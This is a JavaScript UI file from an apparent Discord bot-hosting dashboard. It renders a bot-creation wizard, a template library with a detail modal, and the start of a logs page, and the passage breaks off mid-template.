// The AI prompt body is fully localized through the i18n system.
// `prompt.template` exists in en/fr/de and is fetched lazily via t() so
// language changes are reflected immediately without a full re-render
// of the wizard.
function getPromptTemplate() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  return t('prompt.template');
}

let _newBot = { step: 1, templateId: 'discordjs-blank', packages: {}, envVars: {} };

async function renderNewBot(params = {}) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-new-bot');
  _newBot = {
    step: 1,
    source: 'template',
    templateId: params.templateId || 'discordjs-blank',
    packages: {},
    envVars: {}
  };

  // Fetch templates
  let templates = [];
  try { const data = await NexusAPI.system.templates(); templates = data.templates || []; } catch (_) {}

  page.innerHTML = `
    <div style="max-width:700px;margin:0 auto;">
      <div class="section-title mb-4"><i class="ti ti-plus"></i> ${esc(t('newBot.title'))}</div>
      <div style="font-size:12px;color:var(--tx-3);margin-bottom:16px;">${esc(t('newBot.step1Hint', { n: templates.length }))}</div>

      <!-- Prompt box -->
      <div id="prompt-block" style="display:none;" class="mb-16">
        <div class="prompt-box">
          <div class="prompt-header">
            <div class="prompt-actions">
              <button type="button" class="btn btn-ghost btn-sm" id="btn-prompt-copy" onclick="copyPrompt()">
                <i class="ti ti-copy"></i><span data-prompt-copy-label>${esc(t('prompt.copyButton'))}</span>
              </button>
              <button type="button" class="btn btn-ghost btn-sm" id="btn-prompt-hide" onclick="togglePrompt()">
                <i class="ti ti-eye-off"></i><span data-prompt-hide-label>${esc(t('prompt.hideButton'))}</span>
              </button>
            </div>
            <span class="prompt-title"><i class="ti ti-robot"></i> ${esc(t('prompt.title'))}</span>
          </div>
          <div class="prompt-body" data-prompt-body>${esc(getPromptTemplate())}</div>
        </div>
      </div>

      <!-- Step indicator + AI Prompt button (RIGHT of steps as requested) -->
      <div class="flex-center gap-8 mb-16" style="flex-wrap:wrap;">
        ${[
          {n:1,l:t('newBot.stepDot1Label')},
          {n:2,l:t('newBot.stepDot2Label')},
          {n:3,l:t('newBot.stepDot3Label')}
        ].map(s => `
          <div class="flex-center gap-6">
            <div id="step-dot-${s.n}" style="width:28px;height:28px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;color:var(--tx-3);transition:all 0.2s;">${s.n}</div>
            <span style="font-size:12px;color:var(--tx-3);">${esc(s.l)}</span>
            ${s.n < 3 ? '<i class="ti ti-chevron-right" style="color:var(--tx-3);font-size:12px;"></i>' : ''}
          </div>`).join('')}
        <button class="btn btn-ghost btn-sm" id="btn-prompt" onclick="togglePrompt()" title="${esc(t('editor.aiPromptHint'))}">
          <i class="ti ti-bulb"></i>${esc(t('editor.aiPrompt'))}
        </button>
      </div>

      <div class="card">
        <div id="nb-body" class="card-body"></div>
        <div class="card-footer">
          <button class="btn btn-ghost" id="nb-prev" style="display:none;" onclick="nbPrev()">${esc(t('newBot.prevButton'))}</button>
          <div style="flex:1;"></div>
          <button class="btn btn-ghost" onclick="navigate('bots')">${esc(t('newBot.cancelButton'))}</button>
          <button class="btn btn-primary" id="nb-next" onclick="nbNext()">${esc(t('newBot.nextButton'))}</button>
        </div>
      </div>
    </div>`;

  _newBot.templates = templates;
  nbStep(1);
}

function nbStep(n) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  _newBot.step = n;

  // Update step dots
  for (let i = 1; i <= 3; i++) {
    const dot = document.getElementById(`step-dot-${i}`);
    if (!dot) continue;
    dot.style.background = i < n ? 'var(--green)' : i === n ? 'var(--brand)' : 'transparent';
    dot.style.borderColor = i < n ? 'var(--green)' : i === n ? 'var(--brand)' : 'var(--border)';
    dot.style.color       = i <= n ? '#fff' : 'var(--tx-3)';
    dot.innerHTML         = i < n ? '<i class="ti ti-check" style="font-size:12px;"></i>' : String(i);
  }

  const prev = document.getElementById('nb-prev');
  const next = document.getElementById('nb-next');
  if (prev) prev.style.display = n > 1 ? 'block' : 'none';
  if (next) next.textContent   = n < 3 ? t('newBot.nextButton') : t('newBot.createButton');

  const body = document.getElementById('nb-body');
  if (!body) return;

  if (n === 1) {
    const tpls = _newBot.templates || [];
    const isGithub = _newBot.source === 'github';
    body.innerHTML = `
      <div class="mb-12" style="font-size:13px;font-weight:600;color:var(--tx-2);">${esc(t('newBot.sourceLead'))}</div>
      <div class="source-grid">
        <div class="tpl-card ${!isGithub ? 'selected' : ''}" onclick="selectBotSource('template')" id="src-template">
          <div class="tpl-head"><i class="ti ti-layout-grid tpl-icon"></i></div>
          <div class="tpl-name">${esc(t('newBot.sourceTemplate'))}</div>
          <div class="tpl-desc">${esc(t('newBot.sourceTemplateDesc'))}</div>
        </div>
        <div class="tpl-card ${isGithub ? 'selected' : ''}" onclick="selectBotSource('github')" id="src-github">
          <div class="tpl-head"><i class="ti ti-brand-github tpl-icon"></i></div>
          <div class="tpl-name">${esc(t('newBot.sourceGithub'))}</div>
          <div class="tpl-desc">${esc(t('newBot.sourceGithubDesc'))}</div>
        </div>
      </div>

      <div id="template-source-fields" style="display:${isGithub ? 'none' : 'block'};margin-top:16px;">
        <div class="mb-8 form-hint">${esc(t('newBot.step1LeadHint', { n: tpls.length }))}</div>
        <div class="template-grid" id="tpl-grid">
          ${tpls.map(tpl => {
            const diffRaw = (tpl.difficulty || '').toLowerCase();
            const diffKey = tpl.difficultyKey
              || ((diffRaw === 'débutant' || diffRaw === 'beginner') ? 'beginner'
                : (diffRaw === 'intermédiaire' || diffRaw === 'intermediate') ? 'intermediate'
                : (diffRaw === 'avancé' || diffRaw === 'advanced') ? 'advanced'
                : 'beginner');
            const diffLabel = t('newBotPage.' + diffKey);
            const diffColor = diffKey === 'beginner' ? 'green' : diffKey === 'intermediate' ? 'amber' : 'red';
            return `
            <div class="tpl-card ${tpl.id === _newBot.templateId ? 'selected' : ''}" onclick="selectTpl('${escJs(tpl.id)}')" id="tpl-${esc(tpl.id)}">
              <div class="tpl-head">
                <i class="ti ${tpl.icon} tpl-icon"></i>
                <span class="tpl-badge" style="color:var(--${diffColor});border-color:var(--${diffColor}-b);background:var(--${diffColor}-bg);">${esc(diffLabel)}</span>
              </div>
              <div class="tpl-name">${esc(tpl.name)}</div>
              <div class="tpl-desc">${esc(tpl.longDescription || tpl.description)}</div>
              ${tpl.features && tpl.features.length ? `<ul class="tpl-features">${tpl.features.slice(0, 3).map(f => `<li><i class="ti ti-check" style="color:var(--green);font-size:11px;"></i>${esc(f)}</li>`).join('')}</ul>` : ''}
              <div class="tpl-foot">
                <span><i class="ti ti-package"></i> ${esc(tpl.packages.length === 1 ? t('newBotPage.deps', { n: tpl.packages.length }) : t('newBotPage.depsPlural', { n: tpl.packages.length }))}</span>
                ${tpl.intents && tpl.intents.length ? `<span><i class="ti ti-eye"></i> ${esc(tpl.intents.length === 1 ? t('newBotPage.intents', { n: tpl.intents.length }) : t('newBotPage.intentsPlural', { n: tpl.intents.length }))}</span>` : ''}
                <span class="tpl-version">v${esc(tpl.version || '1')}</span>
              </div>
            </div>`;
          }).join('')}
        </div>
      </div>

      <div id="github-source-fields" style="display:${isGithub ? 'block' : 'none'};margin-top:16px;">
        <div class="form-group">
          <label class="form-label">${esc(t('newBot.repoUrlLabel'))} <span class="form-label-hint">${esc(t('newBot.repoUrlHint'))}</span></label>
          <input class="form-control mono" id="github-repo" placeholder="https://github.com/utilisateur/depot" value="${esc(_newBot.repoUrl || '')}" oninput="githubRepoChanged(this.value)" autocomplete="off"/>
        </div>
        <div class="form-group">
          <label class="form-label">${esc(t('newBot.branchLabel'))} <span class="form-label-hint">${esc(t('newBot.branchHint'))}</span></label>
          <input class="form-control mono" id="github-branch" placeholder="main" value="${esc(_newBot.branch || '')}" autocomplete="off"/>
        </div>
        <div class="form-hint"><i class="ti ti-info-circle"></i>${esc(t('newBot.githubImportHint'))}</div>
      </div>`;
  } else if (n === 2) {
    // Bot config
    const PKGS = [{id:'axios',icon:'ti-world',label:'axios'},{id:'sqlite3',icon:'ti-database',label:'sqlite3'},{id:'mysql2',icon:'ti-database',label:'mysql2'},{id:'ms',icon:'ti-clock',label:'ms'},{id:'node-cron',icon:'ti-calendar',label:'node-cron'},{id:'canvas',icon:'ti-photo',label:'canvas'},{id:'node-fetch',icon:'ti-cloud',label:'node-fetch'},{id:'jimp',icon:'ti-photo-edit',label:'jimp'}];
    body.innerHTML = `
      <div class="form-group">
        <label class="form-label">${esc(t('newBot.step2NameLabel'))} <span class="form-label-hint">${esc(t('newBot.step2NameHint'))}</span></label>
        <input class="form-control" id="bot-name" placeholder="${esc(getBotPlaceholder())}" value="${esc(_newBot.name || '')}" oninput="previewBotName(this.value)" autocomplete="off"/>
        <div id="name-preview" class="form-hint" style="font-family:var(--font-mono);"></div>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(t('newBot.displayNameLabel'))} <span class="form-label-hint">${esc(t('newBot.step2Optional'))}</span></label>
        <input class="form-control" id="bot-display-name-new" placeholder="${esc(t('newBot.displayNamePh'))}" value="${esc(_newBot.displayName || '')}"/>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(t('newBot.step2TokenLabel'))} <span class="form-label-hint"><i class="ti ti-lock"></i>${esc(t('newBot.step2TokenHint').replace(/^[^\s]+\s/, ''))}</span></label>
        <input class="form-control mono" id="bot-token" type="password" placeholder="${esc(t('newBot.tokenPlaceholder'))}" value="${esc(_newBot.token || '')}"/>
        <div class="form-hint"><i class="ti ti-shield-check"></i>${esc(t('newBot.step2TokenShield').replace(/^[^\s]+\s/, ''))}</div>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(t('newBot.step2LangLabel'))} <span class="form-label-hint">${esc(t('newBot.step2LangHint'))}</span></label>
        <div class="lang-picker" id="newbot-lang-picker">
          ${window.NexusI18n ? window.NexusI18n.SUPPORTED.map(code => `
            <button type="button" class="lang-pick${(_newBot.botLanguage || NexusI18n.current())===code?' active':''}" data-botlang="${code}">
              <span class="lang-code">${window.NexusI18n.supportedCodes[code]}</span>
              <span class="lang-name">${window.NexusI18n.supportedNames[code]}</span>
            </button>`).join('') : ''}
        </div>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(t('newBot.step2DescLabel'))} <span class="form-label-hint">${esc(t('newBot.step2Optional'))}</span></label>
        <input class="form-control" id="bot-desc" placeholder="${esc(t('newBot.step2DescPh'))}" value="${esc(_newBot.description || '')}"/>
      </div>
      <div class="form-group">
        <label class="form-label">${esc(t('newBot.step2PackagesLabel'))} <span class="form-label-hint">${esc(t('newBot.step2Optional'))}</span></label>
        <div class="pkg-grid">
          ${PKGS.map(p => `<div class="pkg-item ${_newBot.packages[p.id] ? 'selected' : ''}" onclick="togglePkg('${p.id}')" id="pkg-${p.id}"><i class="ti ${p.icon}"></i>${p.label}</div>`).join('')}
        </div>
      </div>`;
  } else if (n === 3) {
    if (_newBot.source === 'github') {
      body.innerHTML = `
        <div class="empty-state" style="padding:24px;">
          <i class="ti ti-brand-github" style="color:var(--tx-1);font-size:34px;"></i>
          <div class="empty-state-title" style="font-size:14px;">${esc(t('newBot.githubReadyTitle'))}</div>
          <div class="empty-state-desc">${esc(t('newBot.githubReadyDesc', { repo: _newBot.repoUrl || '' }))}</div>
        </div>
        <div class="metric-row"><span class="metric-key">${esc(t('newBot.repoUrlLabel'))}</span><span class="metric-val mono">${esc(_newBot.repoUrl || '—')}</span></div>
        <div class="metric-row"><span class="metric-key">${esc(t('newBot.branchLabel'))}</span><span class="metric-val mono">${esc(_newBot.branch || 'main')}</span></div>
        <div class="form-hint" style="margin-top:12px;"><i class="ti ti-shield-check"></i>${esc(t('newBot.githubReadyHint'))}</div>
        <div id="nb-err" class="form-error mt-8"></div>`;
      return;
    }
    // ENV vars from template
    const tpl = _newBot.templates?.find(x => x.id === _newBot.templateId);
    const envVars = (tpl?.envVars || []).filter(v => v.key !== 'TOKEN');

    body.innerHTML = `
      <div class="mb-8" style="font-size:13px;font-weight:600;color:var(--tx-2);">${esc(t('newBot.step3EnvTitle', { name: tpl?.name || 'Template' }))}</div>
      <div class="mb-12 form-hint"><i class="ti ti-info-circle"></i>${t('newBot.step3EnvHint')}</div>
      ${envVars.length === 0
        ? `<div class="empty-state" style="padding:16px;"><i class="ti ti-circle-check" style="color:var(--green)"></i><div class="empty-state-title" style="font-size:13px;">${esc(t('newBot.step3NoEnvTitle'))}</div><div class="empty-state-desc">${esc(t('newBot.step3NoEnvDesc'))}</div></div>`
        : envVars.map(v => `
          <div class="form-group">
            <label class="form-label">
              ${esc(v.label)} ${v.required ? '<span style="color:var(--red)">*</span>' : `<span class="form-label-hint">${esc(t('newBot.step2Optional'))}</span>`}
              <span style="font-family:var(--font-mono);font-size:10px;color:var(--tx-3);">${esc(v.key)}</span>
            </label>
            <input class="form-control ${v.secret ? 'mono' : ''}" id="env-${esc(v.key)}" type="${v.secret ? 'password' : 'text'}" placeholder="${esc(v.hint || v.label)}" value="${esc(_newBot.envVars?.[v.key] || '')}"/>
          </div>`).join('')
      }
      <div id="nb-err" class="form-error mt-8"></div>`;
  }

  // Bind the bot-language picker (only present on step 2)
  body.querySelectorAll('#newbot-lang-picker .lang-pick').forEach(btn => {
    btn.addEventListener('click', () => {
      const code = btn.dataset.botlang;
      if (!code) return;
      body.querySelectorAll('#newbot-lang-picker .lang-pick').forEach(b => b.classList.toggle('active', b === btn));
    });
  });
}

function selectTpl(id) {
  _newBot.templateId = id;
  document.querySelectorAll('#tpl-grid .tpl-card').forEach(c => c.classList.remove('selected'));
  document.getElementById('tpl-' + id)?.classList.add('selected');
}

function selectBotSource(source) {
  _newBot.source = source === 'github' ? 'github' : 'template';
  document.getElementById('src-template')?.classList.toggle('selected', _newBot.source === 'template');
  document.getElementById('src-github')?.classList.toggle('selected', _newBot.source === 'github');
  const tplFields = document.getElementById('template-source-fields');
  const ghFields = document.getElementById('github-source-fields');
  if (tplFields) tplFields.style.display = _newBot.source === 'template' ? 'block' : 'none';
  if (ghFields) ghFields.style.display = _newBot.source === 'github' ? 'block' : 'none';
}

function githubRepoName(url) {
  try {
    const u = new URL(String(url || '').trim());
    if (u.protocol !== 'https:' || u.hostname !== 'github.com') return '';
    const parts = u.pathname.replace(/\.git$/i, '').split('/').filter(Boolean);
    if (parts.length !== 2) return '';
    return parts[1].toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').slice(0, 64);
  } catch (_) { return ''; }
}

function githubRepoChanged(value) {
  _newBot.repoUrl = String(value || '').trim();
  if (_newBot.name) return;
  const suggested = githubRepoName(_newBot.repoUrl);
  if (suggested) _newBot.name = suggested;
}

function togglePkg(id) {
  _newBot.packages[id] = !_newBot.packages[id];
  document.getElementById('pkg-' + id)?.classList.toggle('selected', !!_newBot.packages[id]);
}

function previewBotName(v) {
  const clean = v.toLowerCase().replace(/[^a-z0-9-]/g, '');
  const el = document.getElementById('name-preview');
  if (el) el.innerHTML = clean ? `<i class="ti ti-folder"></i> /opt/${clean}` : '';
}

/**
 * Returns the example bot-name placeholder in the active UI language.
 * Fallback to English if i18n hasn't loaded yet.
 */
function getBotPlaceholder() {
  if (window.NexusI18n) return NexusI18n.t('placeholders.botName');
  return 'community-manager';
}

function togglePrompt() {
  const bl  = document.getElementById('prompt-block');
  const row = document.getElementById('prompt-show-row');
  if (!bl) return;
  const vis = bl.style.display === 'none';
  bl.style.display = vis ? 'block' : 'none';
  if (row) row.style.display = vis ? 'none' : '';
}

/**
 * Copy the prompt template to the clipboard.
 * Uses the modern Clipboard API when available, falls back to the legacy
 * document.execCommand('copy') path so it works on older browsers and
 * non-secure contexts (HTTP).
 */
function copyPrompt() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const btn = document.getElementById('btn-prompt-copy');
  const label = btn ? btn.querySelector('[data-prompt-copy-label]') : null;
  const defaultLabel = t('prompt.copyButton');
  const copiedLabel = t('common.copied');

  const flash = () => {
    if (label) {
      label.textContent = copiedLabel;
      setTimeout(() => { label.textContent = defaultLabel; }, 2000);
    }
    toast('success', t('prompt.copiedToast'), t('prompt.copiedHint'));
  };

  const fallbackCopy = () => {
    try {
      const ta = document.createElement('textarea');
      ta.value = getPromptTemplate();
      ta.style.position = 'fixed';
      ta.style.opacity  = '0';
      document.body.appendChild(ta);
      ta.select();
      const ok = document.execCommand('copy');
      document.body.removeChild(ta);
      if (ok) flash(); else toast('error', t('prompt.copyFail'));
    } catch (_) {
      toast('error', t('prompt.copyFail'));
    }
  };

  if (navigator.clipboard && window.isSecureContext !== false) {
    navigator.clipboard.writeText(getPromptTemplate()).then(flash, fallbackCopy);
  } else {
    fallbackCopy();
  }
}

function nbPrev() { if (_newBot.step > 1) nbStep(_newBot.step - 1); }

async function nbNext() {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const step = _newBot.step;

  if (step === 1) {
    if (_newBot.source === 'github') {
      const repoUrl = document.getElementById('github-repo')?.value?.trim() || '';
      if (!/^https:\/\/github\.com\/[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+(?:\.git)?\/?$/.test(repoUrl)) {
        toast('error', t('newBot.errorInvalidRepo'), t('newBot.errorInvalidRepoHint'));
        return;
      }
      _newBot.repoUrl = repoUrl;
      _newBot.branch = document.getElementById('github-branch')?.value?.trim() || '';
      if (!_newBot.name) _newBot.name = githubRepoName(repoUrl);
      nbStep(2);
      return;
    }
    if (!_newBot.templateId) { toast('warning', t('newBot.errorNoTemplate')); return; }
    nbStep(2);
  } else if (step === 2) {
    const name  = document.getElementById('bot-name')?.value?.trim();
    const token = document.getElementById('bot-token')?.value?.trim();
    if (!name || !/^[a-z0-9-]{2,64}$/.test(name)) { toast('error', t('newBot.errorInvalidName'), t('newBot.errorInvalidNameHint')); return; }
    if (!token || token.length < 20) { toast('error', t('newBot.errorInvalidToken'), t('newBot.errorInvalidTokenHint')); return; }
    _newBot.name = name;
    _newBot.token = token;
    _newBot.displayName = document.getElementById('bot-display-name-new')?.value?.trim() || '';
    _newBot.description = document.getElementById('bot-desc')?.value?.trim() || '';
    _newBot.botLanguage = document.querySelector('#newbot-lang-picker .lang-pick.active')?.dataset?.botlang
      || (window.NexusI18n ? NexusI18n.current() : 'en');
    nbStep(3);
  } else if (step === 3) {
    // Collect env vars (templates only; a GitHub import carries its own .env)
    const tpl = _newBot.source === 'github' ? null : _newBot.templates?.find(x => x.id === _newBot.templateId);
    const envVars = _newBot.source === 'github' ? [] : (tpl?.envVars || []).filter(v => v.key !== 'TOKEN');
    for (const v of envVars) {
      const el = document.getElementById('env-' + v.key);
      const val = el?.value?.trim() || '';
      if (v.required && !val) {
        const errEl = document.getElementById('nb-err');
        if (errEl) { errEl.textContent = t('newBot.step3RequiredField', { label: v.label }); errEl.style.display = 'block'; }
        return;
      }
      _newBot.envVars[v.key] = val;
    }

    const btn = document.getElementById('nb-next');
    btn.disabled = true;
    btn.innerHTML = `<div class="spinner spinner-sm"></div> ${esc(t(_newBot.source === 'github' ? 'newBot.importing' : 'newBot.creating'))}`;

    try {
      await NexusAPI.bots.create({
        name:          _newBot.name,
        token:         _newBot.token,
        source:        _newBot.source === 'github' ? 'github' : 'template',
        repoUrl:       _newBot.repoUrl || undefined,
        branch:        _newBot.branch || undefined,
        displayName:   _newBot.displayName || undefined,
        templateId:    _newBot.templateId,
        description:   _newBot.description,
        extraPackages: Object.keys(_newBot.packages).filter(k => _newBot.packages[k]),
        envVars:       _newBot.envVars,
        language:      _newBot.botLanguage,
      });
      toast('success', t(_newBot.source === 'github' ? 'newBot.successImportedTitle' : 'newBot.successCreatedTitle'),
        t(_newBot.source === 'github' ? 'newBot.successImportedDesc' : 'newBot.successCreatedDesc', { name: _newBot.displayName || _newBot.name }));
      navigate('bots');
    } catch (e) {
      toast('error', t('newBot.errorCreateTitle'), (e && e.message) || t('errors.genericDesc'));
      btn.disabled = false;
      btn.textContent = t('newBot.createButton');
    }
  }
}

// ------------------------------------------------------------
// TEMPLATES PAGE
// ------------------------------------------------------------
async function loadTemplates() {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-templates');
  page.innerHTML = `<div class="loader"><div class="spinner spinner-lg"></div></div>`;
  try {
    const { templates, categories } = await NexusAPI.system.templates();

    page.innerHTML = `
      <div class="flex-between mb-16">
        <div>
          <div class="section-title mb-4"><i class="ti ti-layout-grid"></i> ${esc(_t('templatesPage.title'))}</div>
          <div style="font-size:12px;color:var(--tx-3);">${esc(_t('templatesPage.count', { n: templates.length }))}</div>
        </div>
        <div class="flex gap-8">
          <input id="tpl-search" class="form-control" style="width:200px;" placeholder="${esc(_t('templatesPage.searchPh'))}" oninput="filterTemplates(this.value)"/>
          <button class="btn btn-primary" onclick="navigate('new-bot')"><i class="ti ti-plus"></i>${esc(_t('templatesPage.createBot'))}</button>
        </div>
      </div>

      <div class="flex gap-8 mb-16" id="tpl-cats">
        <button class="tab-btn active" onclick="filterTplCat('',this)">${esc(_t('templatesPage.all', { n: templates.length }))}</button>
        ${categories.map(c => `<button class="tab-btn" onclick="filterTplCat('${escJs(c.id)}',this)">${esc(c.label)} (${c.count})</button>`).join('')}
      </div>

      <div class="tpl-lib-grid" id="tpl-lib-grid">
        ${renderTplCards(templates)}
      </div>`;

    page._templates = templates;
  } catch (e) {
    page.innerHTML = `<div class="loader" style="color:var(--red);">${esc(e.message)}</div>`;
  }
}

function renderTplCards(templates) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  return templates.map(t => {
    const diffRaw = (t.difficulty || '').toLowerCase();
    const diffKey = t.difficultyKey
      || ((diffRaw === 'débutant' || diffRaw === 'beginner') ? 'beginner'
        : (diffRaw === 'intermédiaire' || diffRaw === 'intermediate') ? 'intermediate'
        : (diffRaw === 'avancé' || diffRaw === 'advanced') ? 'advanced'
        : 'beginner');
    const diffLabel = _t('newBotPage.' + diffKey);
    const diffColor = diffKey === 'beginner' ? 'green' : diffKey === 'intermediate' ? 'amber' : 'red';
    return `
    <div class="tpl-lib-card" onclick="openTemplateDetail('${escJs(t.id)}')">
      <div class="lib-icon"><i class="ti ${t.icon}" style="color:var(--blue)"></i></div>
      <div class="lib-name">${esc(t.name)}</div>
      <div class="lib-desc">${esc(t.description)}</div>
      ${t.features && t.features.length ? `<ul class="lib-features">${t.features.slice(0, 3).map(f => `<li><i class="ti ti-check" style="color:var(--green);"></i>${esc(f)}</li>`).join('')}</ul>` : ''}
      <div class="lib-meta">
        <span class="tpl-lib-meta-tag">${esc(t.runtime)}</span>
        <span class="tpl-lib-meta-tag" style="color:var(--${diffColor});border-color:var(--${diffColor}-b);background:var(--${diffColor}-bg);">${esc(diffLabel)}</span>
        <span class="tpl-lib-meta-tag">${esc(t.packages.length === 1 ? _t('templatesPage.deps', { n: t.packages.length }) : _t('templatesPage.depsPlural', { n: t.packages.length }))}</span>
        ${t.intents && t.intents.length ? `<span class="tpl-lib-meta-tag">${esc(t.intents.length === 1 ? _t('templatesPage.intents', { n: t.intents.length }) : _t('templatesPage.intentsPlural', { n: t.intents.length }))}</span>` : ''}
      </div>
    </div>`;
  }).join('');
}

function filterTemplates(q) {
  const page = document.getElementById('page-templates');
  const all = page._templates || [];
  const filtered = q ? all.filter(t => t.name.toLowerCase().includes(q.toLowerCase()) || t.description.toLowerCase().includes(q.toLowerCase())) : all;
  const el = document.getElementById('tpl-lib-grid');
  if (el) el.innerHTML = renderTplCards(filtered);
}

function filterTplCat(cat, btn) {
  btn.closest('#tpl-cats').querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  const page = document.getElementById('page-templates');
  const all = page._templates || [];
  const filtered = cat ? all.filter(t => t.category === cat) : all;
  const el = document.getElementById('tpl-lib-grid');
  if (el) el.innerHTML = renderTplCards(filtered);
}

function closeTemplateDetail() {
  document.getElementById('template-detail-modal')?.remove();
}

function openTemplateDetail(id) {
  const _t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-templates');
  const t = (page?._templates || []).find(item => item.id === id);
  if (!t) return;
  closeTemplateDetail();
  const diffRaw = (t.difficulty || '').toLowerCase();
  const diffKey = t.difficultyKey
    || ((diffRaw === 'débutant' || diffRaw === 'beginner') ? 'beginner'
      : (diffRaw === 'intermédiaire' || diffRaw === 'intermediate') ? 'intermediate'
      : (diffRaw === 'avancé' || diffRaw === 'advanced') ? 'advanced'
      : 'beginner');
  const diffLabel = _t('newBotPage.' + diffKey);
  const diffColor = diffKey === 'beginner' ? 'green' : diffKey === 'intermediate' ? 'amber' : 'red';
  const envVars = t.envVars || [];
  const files = t.files || [];

  const ov = document.createElement('div');
  ov.id = 'template-detail-modal';
  ov.className = 'modal-overlay';
  ov.innerHTML = `<div class="modal" style="max-width:780px;">
    <div class="modal-header">
      <span class="modal-title"><i class="ti ${esc(t.icon || 'ti-template')}" style="color:var(--blue);"></i>${esc(t.name)}</span>
      <button class="btn-close" onclick="closeTemplateDetail()"><i class="ti ti-x"></i></button>
    </div>
    <div class="modal-body">
      <div class="flex gap-8" style="flex-wrap:wrap;margin-bottom:12px;">
        <span class="tpl-lib-meta-tag">${esc(t.runtime || 'node')}</span>
        <span class="tpl-lib-meta-tag" style="color:var(--${diffColor});border-color:var(--${diffColor}-b);background:var(--${diffColor}-bg);">${esc(diffLabel)}</span>
        ${t.categoryLabel ? `<span class="tpl-lib-meta-tag">${esc(t.categoryLabel)}</span>` : ''}
      </div>
      <p style="font-size:13px;color:var(--tx-2);line-height:1.65;margin-bottom:14px;">${esc(t.longDescription || t.description || '')}</p>
      ${t.features?.length ? `<div class="tpl-detail-section"><div class="tpl-detail-title"><i class="ti ti-list-check"></i>${esc(_t('templatesPage.featuresTitle'))}</div><ul class="tpl-detail-list">${t.features.map(f => `<li><i class="ti ti-check" style="color:var(--green);"></i>${esc(f)}</li>`).join('')}</ul></div>` : ''}
      ${files.length ? `<div class="tpl-detail-section"><div class="tpl-detail-title"><i class="ti ti-files"></i>${esc(_t('templatesPage.filesTitle'))}</div><div class="tpl-detail-files">${files.map(f => `<code>${esc(f)}</code>`).join('')}</div></div>` : ''}
      ${envVars.length ? `<div class="tpl-detail-section"><div class="tpl-detail-title"><i class="ti ti-key"></i>${esc(_t('templatesPage.envTitle'))}</div><div class="tpl-detail-env">${envVars.filter(v => v.key !== 'TOKEN').map(v => `<div class="metric-row"><span class="metric-key"><code>${esc(v.key)}</code> ${v.required ? `<span class="badge badge-amber">${esc(_t('templatesPage.required'))}</span>` : ''}${v.secret ? `<span class="badge badge-unknown">${esc(_t('templatesPage.secret'))}</span>` : ''}</span><span class="metric-val">${esc(v.hint || v.label || '')}</span></div>`).join('') || `<div class="form-hint">${esc(_t('templatesPage.noEnv'))}</div>`}</div></div>` : ''}
      ${t.packages?.length ? `<div class="tpl-detail-section"><div class="tpl-detail-title"><i class="ti ti-package"></i>${esc(_t('templatesPage.packagesTitle'))}</div><div class="tpl-detail-files">${t.packages.map(p => `<code>${esc(p)}</code>`).join('')}</div></div>` : ''}
      <div class="form-hint" style="margin-top:14px;"><i class="ti ti-info-circle"></i>${esc(_t('templatesPage.detailHint'))}</div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeTemplateDetail()">${esc(_t('common.close'))}</button>
      <button class="btn btn-primary" onclick="closeTemplateDetail();useTpl('${escJs(t.id)}')"><i class="ti ti-plus"></i>${esc(_t('templatesPage.useTemplate'))}</button>
    </div>
  </div>`;
  document.body.appendChild(ov);
  ov.onclick = e => { if (e.target === ov) closeTemplateDetail(); };
}

function useTpl(id) {
  _newBot.templateId = id;
  navigate('new-bot', { templateId: id });
}

// ------------------------------------------------------------
// LOGS PAGE
// ------------------------------------------------------------
async function loadLogs(botName) {
  const t = window.NexusI18n ? NexusI18n.t.bind(NexusI18n) : (k) => k;
  const page = document.getElementById('page-logs');
  try {
    const bots = App.bots.length ? App.bots : await NexusAPI.bots.list();
    App.bots = bots;
    const first = botName || bots[0]?.name;
    const errorBots = bots.filter(b => (App.pm2StatusMap[b.name] || b.pm2)?.status === 'errored');

    // Empty state: no bot exists yet
    if (!bots.length) {
      page.innerHTML = `
        <div class="section-title mb-16"><i class="ti ti-terminal"></i> ${esc(t('logs.title'))}</div>
        <div class="card">
          <div class="empty-state" style="padding:48px 24px;">
            <i class="ti ti-robot" style="font-size:48px;color:var(--tx-3);"></i>
            <div class="empty-state-title">${esc(t('empty.noLogsNoBot'))}</div>
            <div class="empty-state-desc">${esc(t('empty.noLogsNoBotDesc'))}</div>
            <div style="margin-top:16px;">
              <button class="btn btn-primary" onclick="navigate('new-bot')"><i class="ti ti-plus"></i> ${esc(t('common.newBot'))}</button>
            </div>
          </div>
        </div>`;
      return;
    }

    page.innerHTML = `
      <div class="flex-between mb-16">
        <span class="section-title"><i class="ti ti-terminal"></i> ${esc(t('logs.title'))}</span>
        <div class="flex gap-8">
          <select class="form-control" id="log-sel" style="width:200px;" onchange="switchLogBot(this.value)">
            ${bots.map(b => `<option value="${esc(b.name)}"${b.name===first?' selected':''}>${esc(b.display_name || b.name)}</option>`).join('')}
          </select>
          <button class="btn btn-ghost btn-sm" onclick="clearLogs()" title="${esc(t('logs.clearBtn'))}"><i class="ti ti-trash"></i></button>
          <button class="btn btn-ghost btn-sm" onclick="exportLogs()" title="${esc(t('logs.refreshBtn'))}"><i class="ti ti-download"></i></button>
        </div>
      </div>

      ${errorBots.length ? `
        <div class="mb-16">
          ${errorBots.map(b => `
            <div class="err-panel">
              <div class="err-panel-title"><i class="ti ti-alert-circle"></i> PM2 ${esc(t('errors.generic'))} — ${esc(b.name)}</div>
